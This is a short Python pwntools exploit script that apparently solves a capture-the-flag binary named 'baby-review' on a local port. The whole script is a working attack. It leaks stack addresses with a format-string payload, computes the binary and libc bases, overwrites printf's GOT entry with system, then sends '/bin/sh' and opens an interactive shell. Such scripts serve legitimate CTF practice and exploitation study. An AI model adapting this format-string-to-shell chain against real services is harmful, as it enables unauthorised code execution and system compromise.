from pwn import *

elf = context.binary = ELF('./baby-review',checksec=False)
libc = ELF('libc.so.6',checksec=False)
p = remote('0.0.0.0',32768)

p.recvline()
print(p.recvline().decode())
capital = input()
p.sendline(capital.encode('utf-8'))

p.clean()
p.sendline(b'5')
p.recvline()
payload = b'%9$p %29$p'
p.sendline(payload)
p.clean()
p.sendline(b'2')
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()

leaks = p.recvline().decode().strip().split(' ')
binLeak = leaks[0]
binBase = int(binLeak,16) - elf.symbols['menu'] - 198
libcLeak = leaks[1]
libcBase = int(libcLeak,16) - libc.symbols['_IO_2_1_stdout_']

elf.address = binBase
libc.address = libcBase

p.clean()
p.sendline(b'5')
p.clean()
writes = {
    elf.got['printf']: libc.symbols['system']
}
payload = fmtstr_payload(10, writes)
p.sendline(payload)

p.clean()
p.sendline(b'2')
p.clean()
p.sendline(b'5')
p.recvline()
p.sendline(b'/bin/sh')
p.clean()
p.sendline(b'2')
p.clean()
p.interactive()
